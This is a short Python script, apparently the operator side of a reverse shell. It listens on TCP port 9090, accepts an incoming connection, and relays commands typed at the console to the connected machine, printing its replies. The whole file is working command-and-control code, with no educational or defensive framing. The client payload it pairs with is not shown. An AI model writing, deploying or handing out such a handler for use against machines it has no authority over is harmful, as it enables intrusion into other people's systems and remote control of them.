#!/usr/bin/python3
import socket
import time

def soc_create():
    global soc
    global ip
    global port
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = ''
    port = 9090             #give your custom port here

def soc_bind():
    global ip
    global port
    soc.bind((ip,port))
    soc.listen(3)

def soc_accept():
    print('Listening for connectiions on port : ',port)
    global connection,address
    connection,address = soc.accept()
    print('Got a connection from ',address)
    cmd_start()

def cmd_start():
    term_com = {'exit','quit', 'terminate'}
    print('Type ',term_com,' to terminate the connection')
    while True:
        cmd_send = input()
        if cmd_send in term_com:
            print('exec:',cmd_send)
            connection.close()
            exit()
        if len(cmd_send) >0:
            cmd_send = cmd_send.encode()
            connection.send(cmd_send)
            cmd_recv = connection.recv(1024)
            cmd_resp = cmd_recv.decode()
            print(cmd_resp, end="")

def main():
    soc_create()
    soc_bind()
    soc_accept()

if __name__ == '__main__':
    main()
